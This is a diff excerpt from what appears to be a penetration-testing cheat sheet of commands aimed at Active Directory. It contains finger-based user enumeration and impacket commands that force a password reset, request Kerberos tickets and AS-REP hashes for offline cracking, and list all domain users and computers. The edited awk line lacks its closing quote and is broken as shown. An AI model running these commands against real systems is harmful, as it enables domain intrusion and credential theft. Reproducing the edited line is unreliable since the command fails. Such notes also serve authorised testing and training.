@@ -323,7 +323,7 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 [*] (88) Kerberos
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
-impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all
+impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}
 impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
